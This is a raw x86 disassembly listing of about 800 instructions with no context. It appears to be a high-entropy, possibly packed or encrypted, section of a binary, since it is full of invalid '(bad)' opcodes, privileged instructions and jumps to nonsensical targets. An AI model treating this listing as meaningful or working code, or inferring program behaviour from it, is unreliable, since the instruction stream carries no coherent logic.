  417e02:	cmp    BYTE PTR [ecx-0x3d2fd881],al
  417e08:	fs dec esp
  417e0a:	gs cwde 
  417e0c:	aas    
  417e0d:	push   ebx
  417e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e0f:	pusha  
  417e10:	cmc    
  417e11:	int    0xd2
  417e13:	jnp    0x417e77
  417e15:	dec    edi
  417e16:	and    al,cl
  417e18:	cmp    DWORD PTR [eax+0x82f67ed],0xd72a10f6
  417e22:	idiv   cl
  417e24:	mov    dl,0xb0
  417e26:	push   esp
  417e27:	xor    edi,DWORD PTR [ecx]
  417e29:	or     DWORD PTR [ebp+0x53f6b053],eax
  417e2f:	in     eax,dx
  417e30:	lods   al,BYTE PTR ds:[esi]
  417e31:	lds    ecx,FWORD PTR [edx]
  417e33:	iret   
  417e34:	in     al,0x6a
  417e36:	ret    0xb598
  417e39:	jbe    0x417e08
  417e3b:	adc    al,0xae
  417e3d:	pop    eax
  417e3e:	jmp    0x417e37
  417e40:	out    0x52,eax
  417e42:	repz rol DWORD PTR [edi+0x3219853d],cl
  417e49:	inc    ebx
  417e4a:	add    esi,DWORD PTR [ebp-0x27b73926]
  417e50:	xor    ch,BYTE PTR [edx-0x7c]
  417e53:	rol    ch,cl
  417e55:	add    al,0x3f
  417e57:	(bad)  
  417e59:	jp     0x417e0e
  417e5b:	adc    bl,BYTE PTR [esi]
  417e5d:	jge    0x417e3f
  417e5f:	add    eax,0x2fd1f7e5
  417e64:	inc    edi
  417e65:	add    ecx,edx
  417e67:	push   ebp
  417e68:	dec    ebp
  417e69:	stos   BYTE PTR es:[edi],al
  417e6a:	neg    DWORD PTR [ebp-0x4db8c7]
  417e70:	add    BYTE PTR [esi-0x9],0xe3
  417e74:	jmp    0xf9607bd
  417e79:	xor    ebx,esp
  417e7b:	mov    bh,BYTE PTR [edx-0x3a]
  417e7e:	or     BYTE PTR [ecx],bl
  417e80:	or     DWORD PTR [edi-0x7e2ad1b8],esp
  417e86:	mov    esp,0xb8783af1
  417e8b:	jnp    0x417ed4
  417e8d:	mov    DWORD PTR [esi+eax*8-0x5b20461a],esi
  417e94:	aad    0xf3
  417e96:	int    0x63
  417e98:	pushf  
  417e99:	mov    ds,esp
  417e9b:	fmul   DWORD PTR [ecx]
  417e9d:	dec    edx
  417e9e:	dec    eax
  417e9f:	sub    eax,0xd9ee92b2
  417ea4:	jle    0x417ef7
  417ea6:	dec    edx
  417ea7:	xor    eax,DWORD PTR [eax]
  417ea9:	rol    BYTE PTR [ecx],cl
  417eab:	gs in  eax,dx
  417ead:	scas   eax,DWORD PTR es:[edi]
  417eae:	out    0x39,al
  417eb0:	retfw  0xcd71
  417eb4:	cmp    BYTE PTR [ebx+0x69],ah
  417eb7:	ins    BYTE PTR es:[edi],dx
  417eb8:	outs   dx,BYTE PTR ds:[esi]
  417eb9:	pop    edx
  417eba:	sahf   
  417ebb:	data16 adc ch,BYTE PTR [edx]
  417ebe:	cmc    
  417ebf:	mov    ecx,0xe5b78ff5
  417ec4:	mov    cl,ch
  417ec6:	xor    eax,0xd0bdf2ad
  417ecb:	test   eax,0x2fd57715
  417ed0:	jnp    0x417f2f
  417ed2:	and    ecx,ebp
  417ed4:	inc    esi
  417ed5:	jnp    0x417e59
  417ed7:	sbb    esi,DWORD PTR [edi+0x428fd36b]
  417edd:	pusha  
  417ede:	pop    ebx
  417edf:	retf   
  417ee0:	inc    ebp
  417ee1:	std    
  417ee2:	adc    al,0x42
  417ee4:	(bad)  
  417ee5:	push   ebp
  417ee6:	cmp    edi,DWORD PTR [edx]
  417ee8:	mov    dl,0xad
  417eea:	push   es
  417eeb:	in     eax,dx
  417eec:	mov    edx,DWORD PTR [eax]
  417eee:	gs iret 
  417ef0:	mov    WORD PTR [ecx+edx*4+0x4958479],ds
  417ef7:	lds    ecx,FWORD PTR [edi-0x43]
  417efa:	aaa    
  417efb:	std    
  417efc:	pop    ecx
  417efd:	fs cld 
  417eff:	std    
  417f00:	jge    0x417e9f
  417f02:	loope  0x417f07
  417f04:	jb     0x417e93
  417f06:	stos   DWORD PTR es:[edi],eax
  417f07:	jae    0x417eff
  417f09:	ss stos DWORD PTR es:[edi],eax
  417f0b:	push   edx
  417f0c:	hlt    
  417f0d:	ud0    ebx,esi
  417f10:	in     al,dx
  417f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f12:	div    DWORD PTR [esi+ebx*1-0x70630512]
  417f19:	xor    ah,BYTE PTR [edx]
  417f1b:	sbb    dl,bl
  417f1d:	loop   0x417f5a
  417f1f:	jb     0x417ecf
  417f21:	pop    edi
  417f22:	cli    
  417f23:	rcr    bl,cl
  417f25:	arpl   sp,cx
  417f27:	sbb    DWORD PTR [eax+edx*2-0x3ef7747e],ecx
  417f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f2f:	mov    al,ds:0x7f617089
  417f34:	(bad)  [ebx+ebx*4-0x7c]
  417f38:	in     eax,dx
  417f39:	mov    dh,0xd9
  417f3b:	scas   al,BYTE PTR es:[edi]
  417f3c:	mov    ds:0x1c971e19,al
  417f41:	mov    al,0x6e
  417f43:	addr16 xchg esi,eax
  417f45:	xchg   BYTE PTR [ecx+0x6ace47ba],bl
  417f4b:	adc    BYTE PTR ds:0xc92e373d,0xb3
  417f52:	aaa    
  417f53:	sbb    BYTE PTR ds:0x485829fa,cl
  417f59:	nop
  417f5a:	pop    esi
  417f5b:	and    BYTE PTR [ebp+0x90e8a61],bh
  417f61:	add    DWORD PTR [ebx+0x34],0xffffff89
  417f65:	cld    
  417f66:	fsincos 
  417f68:	sbb    dh,BYTE PTR [edi+0x2b03d8ae]
  417f6e:	mov    eax,0xf1cc48db
  417f73:	stos   BYTE PTR es:[edi],al
  417f74:	(bad)  
  417f75:	sub    esi,ecx
  417f77:	mov    esi,0x5c96154a
  417f7c:	ds and bh,bl
  417f7f:	dec    ebx
  417f80:	sbb    al,0x5
  417f82:	jg     0x417faa
  417f84:	or     ecx,DWORD PTR [eax-0x6b]
  417f87:	mov    edx,0x8d2814aa
  417f8c:	dec    edi
  417f8d:	sbb    ecx,ebp
  417f8f:	fisubr DWORD PTR [edx+0x3659311f]
  417f95:	stos   BYTE PTR es:[edi],al
  417f96:	int3   
  417f97:	jge    0x417f1d
  417f99:	sbb    BYTE PTR cs:[ecx-0x6b],cl
  417f9d:	sbb    eax,0xeee810ca
  417fa2:	stos   BYTE PTR es:[edi],al
  417fa3:	shl    DWORD PTR [eax],1
  417fa5:	pushf  
  417fa6:	mov    ch,0xc0
  417fa8:	pop    edx
  417fa9:	les    esi,FWORD PTR [edi-0x42]
  417fac:	ja     0x417f67
  417fae:	loope  0x417fce
  417fb0:	outs   dx,DWORD PTR ds:[esi]
  417fb1:	or     DWORD PTR [ebx+0x7d775636],esp
  417fb7:	or     al,0x68
  417fb9:	shl    DWORD PTR [esi-0xb],1
  417fbc:	in     eax,0xd4
  417fbe:	aaa    
  417fbf:	push   cs
  417fc0:	sub    eax,0x1d60bcac
  417fc5:	dec    esp
  417fc6:	retf   
  417fc7:	and    bl,ah
  417fc9:	inc    ebx
  417fca:	das    
  417fcb:	add    esp,esi
  417fcd:	or     ah,BYTE PTR [ebx+0x12abbcce]
  417fd3:	stos   DWORD PTR es:[edi],eax
  417fd4:	adc    eax,0x7364027
  417fd9:	mov    cl,0x97
  417fdb:	xor    al,0x1c
  417fde:	pop    ebp
  417fdf:	fidivr DWORD PTR [eax-0x4a1377f4]
  417fe5:	push   0x659e353
  417fea:	outs   dx,DWORD PTR ds:[esi]
  417feb:	ins    DWORD PTR es:[edi],dx
  417fec:	sbb    ebp,edi
  417fee:	jo     0x417fbf
  417ff0:	inc    edi
  417ff1:	jecxz  0x418003
  417ff3:	jo     0x417fe3
  417ff5:	(bad)  
  417ff6:	or     al,0x56
  417ff8:	enter  0xaee6,0xbd
  417ffc:	push   cs
  417ffd:	cmc    
  417ffe:	arpl   WORD PTR [esi+0x11ef4380],ax
  418004:	sbb    esp,esp
  418006:	enter  0x6977,0xe8
  41800a:	(bad)  
  41800b:	pop    esp
  41800c:	jl     0x417ff5
  41800e:	sbb    eax,0x2da0456f
  418013:	fadd   DWORD PTR [eax]
  418015:	sub    ebx,DWORD PTR fs:[esi]
  418018:	dec    ebx
  418019:	lock lods al,BYTE PTR ds:[esi]
  41801b:	sahf   
  41801c:	hlt    
  41801d:	ret    
  41801e:	jle    0x41800d
  418020:	into   
  418021:	mov    al,0x89
  418023:	push   ss
  418024:	adc    eax,0x2ee3f03
  418029:	add    al,0xc4
  41802b:	icebp  
  41802c:	cdq    
  41802d:	mov    ebx,0xd2cf5f6f
  418032:	std    
  418033:	and    BYTE PTR [edx],ch
  418035:	mov    ch,BYTE PTR es:[edx]
  418038:	dec    edx
  418039:	mov    edi,0x57cc84a0
  41803e:	mov    esi,0x4dc67146
  418043:	out    dx,eax
  418044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418046:	mov    esp,0xe2458a13
  41804b:	and    BYTE PTR ds:0xf30cf261,al
  418051:	xor    ebx,esi
  418053:	dec    esi
  418054:	jg     0x417fec
  418056:	hlt    
  418057:	jge    0x418056
  418059:	dec    ebx
  41805a:	mov    ecx,DWORD PTR [edi]
  41805c:	sub    edx,DWORD PTR [esi+0x5352ce9e]
  418062:	popa   
  418063:	push   edx
  418064:	sub    eax,0x196711a0
  418069:	push   ebx
  41806a:	repz fild DWORD PTR [edx+edx*2-0xa]
  41806f:	xchg   BYTE PTR [esi+0x8bcbba8],dh
  418075:	dec    eax
  418076:	ret    0x559d
  418079:	inc    edx
  41807a:	push   es
  41807b:	repnz mov ecx,0x7af7e587
  418081:	in     al,dx
  418082:	xor    ecx,DWORD PTR [ebx+0x2b]
  418085:	enter  0xdcfd,0xc7
  418089:	loop   0x4180c8
  41808b:	ror    BYTE PTR [edx-0x51],1
  41808e:	bound  eax,QWORD PTR [edi-0x4f]
  418091:	sub    ebp,ebx
  418093:	ficomp WORD PTR [ebp-0x16]
  418096:	adc    edx,edi
  418098:	mul    DWORD PTR [eax+0x52]
  41809b:	inc    ebp
  41809c:	lahf   
  41809d:	rcl    DWORD PTR [ebx+0x56647465],0x1
  4180a4:	fnstenv [ebp+0x21]
  4180a7:	cmp    DWORD PTR [eax],0xaffebd95
  4180ad:	outs   dx,DWORD PTR ds:[esi]
  4180ae:	jmp    0xbe09346
  4180b3:	repnz lods eax,DWORD PTR ds:[esi]
  4180b5:	or     eax,0x9965a1d4
  4180ba:	data16 jo 0x41803f
  4180bd:	loopne 0x4180bf
  4180bf:	mov    esp,0x247e4157
  4180c4:	repnz aad 0xe2
  4180c7:	adc    eax,DWORD PTR [edi-0xc]
  4180ca:	dec    ebx
  4180cb:	dec    esp
  4180cc:	test   BYTE PTR [eax+0x61fda8ec],bl
  4180d2:	stos   DWORD PTR es:[edi],eax
  4180d3:	xchg   ebp,eax
  4180d4:	fsubr  QWORD PTR [eax]
  4180d6:	pop    ebx
  4180d7:	and    ebx,esi
  4180d9:	mov    eax,0x4f0d4835
  4180de:	sti    
  4180df:	mov    ebp,0x69f3144a
  4180e4:	lods   eax,DWORD PTR ds:[esi]
  4180e5:	imul   esp,edx,0xd49ce3b4
  4180eb:	jg     0x418084
  4180ed:	mov    bh,dl
  4180ef:	xor    al,0x79
  4180f1:	or     al,0x7a
  4180f3:	cmp    ah,BYTE PTR [edx-0x377b3da]
  4180f9:	push   es
  4180fa:	pop    ss
  4180fb:	mov    esp,0x754863c3
  418100:	pop    esp
  418101:	xchg   esi,eax
  418102:	jmp    DWORD PTR [ebp+0x41]
  418105:	inc    edi
  418106:	add    edi,edx
  418108:	jp     0x4180a5
  41810a:	cli    
  41810b:	mul    DWORD PTR [edi]
  41810d:	add    dl,dh
  41810f:	inc    ecx
  418110:	dec    ebp
  418111:	fsub   st,st(1)
  418113:	jae    0x41818a
  418115:	shl    DWORD PTR [ecx+edi*4],1
  418118:	add    al,0x7
  41811a:	cmc    
  41811b:	popa   
  41811c:	cmp    al,0x31
  41811e:	inc    ecx
  41811f:	loopne 0x41815d
  418121:	rol    DWORD PTR ds:0xe229ac90,1
  418127:	vmptrst QWORD PTR [edi-0x76d3a03f]
  41812e:	mov    WORD PTR [edi],gs
  418130:	fwait
  418131:	xchg   edx,eax
  418132:	mov    ecx,0x9442f023
  418137:	jo     0x4180dd
  418139:	cmc    
  41813a:	jne    0x41816e
  41813c:	adc    DWORD PTR [esi+0x3f9bfabb],0x808abb9f
  418146:	js     0x418136
  418148:	(bad)  
  418149:	ftst   
  41814b:	scas   al,BYTE PTR es:[edi]
  41814c:	xchg   BYTE PTR [ecx+ebx*1],ah
  41814f:	loopne 0x418142
  418151:	jno    0x418121
  418153:	enter  0x530c,0xca
  418157:	ja     0x4180fa
  418159:	into   
  41815a:	xchg   ecx,eax
  41815b:	pop    esi
  41815c:	push   edi
  41815d:	out    0x75,eax
  41815f:	and    ax,0xbb5a
  418163:	inc    ebp
  418164:	popa   
  418165:	popf   
  418166:	mov    edx,ebx
  418168:	inc    esp
  418169:	pop    esp
  41816a:	nop
  41816b:	pop    esp
  41816c:	out    0x1a,eax
  41816e:	pop    ebx
  41816f:	pop    ebp
  418170:	gs jl  0x41819c
  418173:	rcl    cl,1
  418175:	and    ecx,DWORD PTR [esi]
  418177:	pop    esi
  418178:	xchg   edx,eax
  418179:	push   0xb85c11a2
  41817e:	test   eax,0x77807a6b
  418183:	mov    dh,0xe8
  418185:	and    al,0x70
  418187:	inc    ebp
  418188:	sub    eax,DWORD PTR [ebx+0xb]
  41818b:	jo     0x4181e7
  41818d:	popa   
  41818e:	or     al,0xf7
  418190:	stc    
  418191:	out    dx,al
  418192:	pop    ds
  418193:	in     eax,0x37
  418195:	adc    cl,BYTE PTR [ecx-0x5da0933b]
  41819b:	or     al,0xf
  41819d:	(bad)  
  41819e:	test   al,0x12
  4181a0:	leave  
  4181a1:	xchg   ebp,eax
  4181a2:	dec    ebp
  4181a3:	mov    cl,0xed
  4181a5:	mov    BYTE PTR [ebx-0xe9da000],dl
  4181ab:	push   ecx
  4181ac:	outs   dx,DWORD PTR ds:[esi]
  4181ad:	in     eax,dx
  4181ae:	sub    BYTE PTR [ecx-0x3],dl
  4181b1:	std    
  4181b2:	ret    0x6556
  4181b5:	mov    eax,ds:0x4e793700
  4181ba:	aad    0xf
  4181bc:	jmp    0xeda5:0x840b633a
  4181c3:	pusha  
  4181c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181c5:	imul   eax,esp,0xffffffa1
  4181c8:	loop   0x41822d
  4181ca:	mov    dl,0xe1
  4181cc:	and    bh,BYTE PTR [ebx+0x35]
  4181cf:	mov    BYTE PTR [edi],ah
  4181d1:	(bad)  
  4181d3:	sub    dl,BYTE PTR [esi]
  4181d5:	jnp    0x418220
  4181d7:	jae    0x41818d
  4181d9:	pop    esi
  4181da:	ins    DWORD PTR es:[edi],dx
  4181db:	clc    
  4181dc:	arpl   WORD PTR [edi+0x2b],dx
  4181df:	jns    0x4181d3
  4181e1:	jb     0x418249
  4181e3:	mov    ecx,0xbc8b02ec
  4181e8:	fstp   TBYTE PTR ds:0xa3940144
  4181ee:	in     al,dx
  4181ef:	sti    
  4181f0:	lods   al,BYTE PTR ds:[esi]
  4181f1:	scas   eax,DWORD PTR es:[edi]
  4181f2:	jno    0x41823d
  4181f4:	rcr    BYTE PTR [edx+0x3d77980],0x18
  4181fb:	aaa    
  4181fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181fd:	jo     0x41821d
  4181ff:	out    0x69,al
  418201:	pushf  
  418202:	iret   
  418203:	nop
  418204:	in     eax,dx
  418205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418206:	mov    dh,0x5a
  418208:	pop    ds
  418209:	push   cs
  41820a:	mov    ds:0x3159bd59,al
  41820f:	sub    dl,BYTE PTR [esi]
  418211:	pop    ecx
  418212:	xchg   ebx,eax
  418213:	pop    ebp
  418214:	hlt    
  418215:	idiv   DWORD PTR [ebx-0x62]
  418218:	sbb    bl,BYTE PTR [ecx+0x62]
  41821b:	(bad)  
  41821c:	lock dec ebx
  41821e:	sahf   
  41821f:	pop    ebp
  418220:	jbe    0x41826b
  418222:	pop    esi
  418223:	jl     0x41821a
  418225:	clc    
  418226:	inc    ebx
  418227:	lea    ebp,[eax+0x7b]
  41822a:	pop    ds
  41822b:	or     al,0xe5
  41822d:	test   BYTE PTR [edx-0x24],dh
  418230:	enter  0xcbe0,0xce
  418234:	sbb    al,0x61
  418236:	xor    BYTE PTR [eax],bl
  418238:	scas   al,BYTE PTR es:[edi]
  418239:	add    al,0x78
  41823b:	push   ds
  41823c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41823d:	test   al,0xdb
  41823f:	ds push eax
  418241:	pop    ds
  418242:	push   ebx
  418243:	jge    0x418296
  418245:	dec    eax
  418246:	or     bh,BYTE PTR [eax+0xc]
  418249:	dec    edx
  41824a:	dec    edi
  41824b:	xor    al,0xbf
  41824d:	cmp    dh,BYTE PTR [ebp-0x78510072]
  418253:	ret    
  418254:	dec    esp
  418255:	cdq    
  418256:	hlt    
  418257:	mov    ecx,fs
  418259:	jb     0x41821a
  41825b:	test   BYTE PTR [edx],0x91
  41825e:	xor    al,0xd4
  418260:	jb     0x4182d7
  418262:	jb     0x418245
  418264:	imul   edi,DWORD PTR [esi-0x3f],0xffffff92
  418268:	fcmovne st,st(7)
  41826a:	cmp    al,0x12
  41826c:	adc    DWORD PTR ds:0xc90333b1,esi
  418272:	mov    cl,0x3c
  418274:	cmp    cl,BYTE PTR [edi+0x134c6690]
  41827a:	adc    BYTE PTR [edi+edi*4+0x7d8a8d15],0x6a
  418282:	xchg   esp,eax
  418283:	outs   dx,BYTE PTR ds:[esi]
  418284:	push   edx
  418285:	cwde   
  418286:	jnp    0x418289
  418288:	dec    edx
  418289:	jle    0x41826b
  41828b:	cwde   
  41828c:	lods   al,BYTE PTR ds:[esi]
  41828d:	cli    
  41828e:	clc    
  41828f:	xchg   ebp,eax
  418290:	jno    0x41826e
  418292:	jnp    0x4182a5
  418294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418295:	(bad)  
  418296:	sti    
  418297:	mov    DWORD PTR [esi*1-0x32d65612],esp
  41829e:	sbb    ebp,edi
  4182a0:	addr16 mov ah,0x1e
  4182a3:	clc    
  4182a4:	or     eax,ecx
  4182a6:	mov    cl,0xd7
  4182a8:	mov    cs,WORD PTR [ebp-0x54940613]
  4182ae:	fidivr DWORD PTR [esi+0x2a]
  4182b1:	fimul  DWORD PTR [ecx+0x23]
  4182b4:	sub    BYTE PTR [esi-0x70c2d475],0x7f
  4182bb:	pop    edi
  4182bc:	or     al,0xa1
  4182be:	jl     0x418289
  4182c0:	addr16 iret 
  4182c2:	inc    ebp
  4182c3:	adc    edx,ebp
  4182c5:	iret   
  4182c6:	(bad)  
  4182c7:	jae    0x4182f4
  4182c9:	enter  0x65b7,0xd0
  4182cd:	push   ebp
  4182ce:	lea    ecx,[edi+0x35]
  4182d1:	and    edi,ecx
  4182d3:	mov    ds:0xef83b477,al
  4182d8:	push   cs
  4182d9:	fdivr  QWORD PTR [eax-0x7e]
  4182dc:	sub    DWORD PTR ds:[ecx],esi
  4182df:	mov    ebx,0x366f1d9a
  4182e4:	adc    DWORD PTR [edx-0x39],edi
  4182e7:	scas   eax,DWORD PTR es:[edi]
  4182e8:	mov    eax,0x3c41b62e
  4182ed:	rol    BYTE PTR [ecx-0x7231d869],1
  4182f3:	dec    eax
  4182f4:	sub    BYTE PTR [bx-0x7dfd],dh
  4182f9:	pop    esp
  4182fa:	sbb    eax,0x54d2030a
  4182ff:	and    BYTE PTR [esi-0x38fdca15],0x60
  418306:	iret   
  418307:	add    eax,0x67f853c7
  41830c:	add    ah,BYTE PTR [ebp+0x2a]
  41830f:	sbb    esp,DWORD PTR [edx-0x142a95d7]
  418315:	sub    ebx,esi
  418317:	gs stc 
  418319:	inc    ecx
  41831a:	cmp    al,0x60
  41831c:	dec    ecx
  41831d:	inc    ebp
  41831e:	inc    esp
  41831f:	out    dx,al
  418320:	int    0xe8
  418322:	test   DWORD PTR [edx+0x5c],0xbda75e54
  418329:	bound  eax,QWORD PTR [ecx-0x23]
  41832c:	inc    ebx
  41832d:	sbb    BYTE PTR ss:[ebx+0x575bfeb],al
  418334:	sub    BYTE PTR [ebx],bh
  418336:	dec    eax
  418337:	cld    
  418338:	test   DWORD PTR [eax],ebx
  41833a:	push   cs
  41833b:	not    DWORD PTR [eax]
  41833d:	(bad)  
  41833e:	sbb    DWORD PTR [ecx+0x19cbb1fb],eax
  418344:	push   es
  418345:	pop    edi
  418346:	pop    ecx
  418347:	sti    
  418348:	lds    edi,FWORD PTR [edi-0x7e062023]
  41834e:	lahf   
  41834f:	test   eax,0x3295c923
  418354:	stos   BYTE PTR es:[edi],al
  418355:	(bad)  
  418356:	mul    BYTE PTR [ecx]
  418358:	add    DWORD PTR [ebp+0x9],ecx
  41835b:	push   eax
  41835c:	or     DWORD PTR [edi],ebp
  41835e:	and    eax,0xa2a6135d
  418363:	mov    ah,bh
  418365:	cmp    ah,cl
  418367:	push   ebp
  418368:	push   esi
  418369:	jecxz  0x4183b4
  41836b:	and    DWORD PTR [edi-0x546d394a],eax
  418371:	cmp    edi,ecx
  418373:	cmp    eax,0xb4de58b9
  418378:	jae    0x418316
  41837a:	mov    bl,0xbc
  41837c:	data16 cli 
  41837e:	push   ecx
  41837f:	scas   al,BYTE PTR es:[edi]
  418380:	aaa    
  418381:	add    dh,bl
  418383:	pop    ds
  418384:	or     al,0xf3
  418387:	data16 adc BYTE PTR [ebp-0xc],dh
  41838b:	gs mov ebp,0xad41c94c
  418391:	cdq    
  418392:	mov    ds:0x52dbb215,al
  418397:	push   ds
  418398:	lods   eax,DWORD PTR ds:[esi]
  418399:	cmp    DWORD PTR [ebx],edi
  41839b:	fsub   DWORD PTR [esi-0x33b5ea2a]
  4183a1:	push   cs
  4183a2:	in     al,dx
  4183a3:	xor    esp,DWORD PTR fs:[edx-0x77]
  4183a7:	into   
  4183a8:	xor    al,0xf1
  4183aa:	aam    0xea
  4183ac:	lahf   
  4183ad:	pop    ebx
  4183ae:	(bad)  
  4183af:	int    0x54
  4183b1:	(bad)
  4183b4:	gs test al,bl
  4183b7:	repz cmp al,0x39
  4183ba:	ss repnz cmp al,0x74
  4183be:	fiadd  WORD PTR [ebp+0x69a290a8]
  4183c4:	stc    
  4183c5:	or     eax,0xa0213aca
  4183ca:	mov    dh,dh
  4183cc:	int3   
  4183cd:	jmp    0x2fe8:0xdc469735
  4183d4:	(bad)  
  4183d5:	push   0x3a007fa6
  4183da:	cmp    cl,bh
  4183dc:	adc    ebx,eax
  4183de:	(bad)  
  4183df:	in     al,dx
  4183e0:	pop    edi
  4183e1:	fcmovbe st,st(7)
  4183e3:	jle    0x4183f7
  4183e5:	cmp    BYTE PTR [ecx+ecx*2],dh
  4183e8:	jecxz  0x4183b7
  4183ea:	mov    eax,0x765d975c
  4183ef:	inc    ecx
  4183f0:	push   0xc7476311
  4183f5:	push   0x6fffef19
  4183fa:	sbb    BYTE PTR [ebx],0xef
  4183fd:	adc    BYTE PTR [eax],ah
  4183ff:	or     al,0x57
  418401:	add    esi,DWORD PTR [ebx-0x4d4993fe]
  418407:	scas   eax,DWORD PTR es:[edi]
  418408:	in     al,dx
  418409:	xchg   ebp,eax
  41840a:	mov    esi,fs
  41840c:	and    al,0xa3
  41840e:	xor    BYTE PTR [ecx-0x23c70138],bl
  418414:	jnp    0x418403
  418416:	gs pop edi
  418418:	clc    
  418419:	or     BYTE PTR [ebx-0x11bdac1d],0x72
  418420:	mov    ecx,0x7c4962cb
  418425:	js     0x418461
  418427:	push   ss
  418428:	mov    eax,0xda7f800f
  41842d:	sbb    ah,bl
  41842f:	fsubr  DWORD PTR [edi-0x6ca202cd]
  418435:	pop    edi
  418436:	loop   0x418457
  418438:	mov    esp,0x6f441e88
  41843d:	test   BYTE PTR [ecx],bh
  41843f:	jb     0x41842c
  418441:	popf   
  418442:	mov    BYTE PTR [edx-0x3f],0x83
  418446:	push   esp
  418447:	cmc    
  418448:	push   ss
  418449:	lahf   
  41844a:	cmc    
  41844b:	adc    esp,DWORD PTR [eax+esi*2+0x36]
  41844f:	outs   dx,BYTE PTR ds:[esi]
  418450:	add    al,0x7e
  418452:	fisubr DWORD PTR [edx-0x43]
  418455:	jns    0x41847c
  418457:	or     al,0xd1
  418459:	repz pop esi
  41845b:	imul   edi,DWORD PTR [edi],0x2ee987d7
  418461:	adc    ah,al
  418463:	das    
  418464:	or     eax,0x6e72bc72
  418469:	push   0xffffffde
  41846b:	fldcw  WORD PTR [edx-0x46]
  41846e:	pop    ss
  41846f:	lds    eax,FWORD PTR [edx+0x1a3fa64c]
  418475:	sbb    BYTE PTR [ebx+0x13],cl
  418478:	sub    al,0x71
  41847a:	iret   
  41847b:	mov    eax,0x591e95a5
  418480:	xchg   ecx,eax
  418481:	or     BYTE PTR [ebx-0x4aa541d1],bh
  418487:	sbb    DWORD PTR [eax-0x4e],ebp
  41848a:	cmp    ebp,ecx
  41848c:	inc    edx
  41848e:	mov    al,ds:0xfa6e522f
  418493:	int3   
  418494:	bound  edx,QWORD PTR [edi+0x35f61715]
  41849a:	test   edi,ebx
  41849c:	xchg   edi,eax
  41849d:	xchg   ebp,eax
  41849e:	mov    WORD PTR [edx-0x60ea5958],?
  4184a4:	mov    bh,0x93
  4184a6:	or     BYTE PTR [edx],ch
  4184a8:	mov    edx,0xdd6b4bc
  4184ad:	sbb    BYTE PTR [edi],ch
  4184af:	lock push ss
  4184b1:	pop    edi
  4184b2:	push   DWORD PTR [edx-0x7390bb9f]
  4184b8:	scas   eax,DWORD PTR es:[edi]
  4184b9:	cwde   
  4184ba:	dec    ecx
  4184bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184bc:	in     eax,0x9
  4184be:	cwde   
  4184bf:	xor    eax,0x79e181d8
  4184c4:	adc    al,0x2b
  4184c6:	or     al,0xda
  4184c8:	mov    al,ds:0x6b825b85
  4184cd:	xchg   esi,eax
  4184ce:	les    esp,FWORD PTR [ebp-0x4085f840]
  4184d4:	(bad)  
  4184d6:	and    dl,dh
  4184d8:	jno    0x418516
  4184da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184db:	pop    ds
  4184dc:	push   ss
  4184dd:	bnd js 0x41852c
  4184e0:	in     eax,0x76
  4184e2:	lea    esp,[eax+edi*2]
  4184e5:	push   ebx
  4184e6:	js     0x41855f
  4184e8:	and    eax,0x7db5cf42
  4184ed:	pop    esi
  4184ee:	pushf  
  4184ef:	xchg   BYTE PTR [ebp-0x11],ch
  4184f2:	daa    
  4184f3:	mov    edi,ebp
  4184f5:	sub    eax,0xb977d642
  4184fa:	dec    ebx
  4184fb:	sub    al,0xd4
  4184fd:	pop    edx
  4184fe:	dec    ecx
  4184ff:	aam    0x45
  418501:	stos   BYTE PTR es:[edi],al
  418502:	jmp    0xbccc:0xdd22a401
  418509:	mov    eax,?
  41850b:	pop    esi
  41850c:	(bad)  
  41850d:	in     al,dx
  41850e:	push   edx
  41850f:	and    ebx,edi
  418511:	sub    bh,0xb2
  418514:	mov    dh,0x8
  418516:	mov    DWORD PTR [esi],esp
  418518:	int3   
  418519:	in     al,dx
  41851a:	push   ecx
  41851b:	sahf   
  41851c:	cmp    DWORD PTR [edx],edx
  41851e:	mov    dl,0x70
  418520:	rcl    BYTE PTR [ebx],1
  418522:	js     0x418519
  418524:	dec    ecx
  418525:	sub    al,0x34
  418527:	sub    al,0xda
  418529:	inc    ecx
  41852a:	jo     0x41858e
  41852c:	sub    ch,BYTE PTR ss:[eax-0x1cd4ae4a]
  418533:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418535:	ficom  DWORD PTR [edi]
  418537:	or     al,0xa2
  418539:	test   eax,0x53a0d184
  41853e:	jp     0x418521
  418540:	adc    eax,DWORD PTR [edi+edx*1+0x66]
  418544:	jns    0x41851f
  418546:	in     al,0x54
  418548:	out    dx,eax
  418549:	or     bh,cl
  41854b:	pop    ebx
  41854c:	xchg   esp,eax
  41854d:	dec    ecx
  41854e:	mov    dh,0xe6
  418550:	jbe    0x418513
  418552:	out    0x74,al
  418554:	pop    edx
  418555:	push   es
  418556:	(bad)  
  418557:	aad    0x2e
  418559:	inc    ecx
  41855a:	and    eax,0x7586944b
  41855f:	push   esp
  418560:	mov    bh,0x1f
  418562:	lds    ecx,FWORD PTR cs:[ebx]
  418565:	das    
  418566:	cmp    bh,0x31
  418569:	cmp    dl,bl
  41856b:	jmp    0x41853b
  41856d:	xchg   edi,eax
  41856e:	pop    ss
  41856f:	jnp    0x41851e
  418571:	pop    edi
  418572:	lods   eax,DWORD PTR ds:[esi]
  418573:	pop    ds
  418574:	cld    
  418575:	push   esi
  418576:	mov    bh,0x2e
  418578:	xor    bl,BYTE PTR [ecx]
  41857a:	ins    DWORD PTR es:[edi],dx
  41857b:	fisubr WORD PTR [esi+0x33]
  41857e:	push   edi
  41857f:	xchg   BYTE PTR [ecx],ah
  418581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418582:	inc    esp
  418583:	pop    ds
  418584:	loopne 0x418576
  418586:	in     al,0xa
  418588:	test   BYTE PTR [ebx-0x5e84cdca],dh
  41858e:	or     al,0x46
  418590:	sub    ebp,esi
  418592:	sub    BYTE PTR [edx],0xc2
  418595:	pop    edx
  418596:	or     eax,0x8f887bf2
  41859b:	add    edi,edi
